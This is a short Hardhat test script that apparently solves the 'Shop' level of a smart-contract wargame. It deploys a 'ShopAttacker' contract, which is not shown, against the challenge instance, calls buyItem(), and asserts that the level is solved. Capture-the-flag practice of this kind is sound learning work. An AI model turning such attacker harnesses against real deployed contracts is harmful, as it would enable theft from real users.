import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Shop`);
  const challengeAddress = await createChallenge(
    `0xBE732789f2963E0522719F2D3fB55E6bfe07e92e`,
    ethers.utils.parseEther(`1`)
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('ShopAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy(challenge.address)

  await attacker.connect(eoa).buyItem()

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
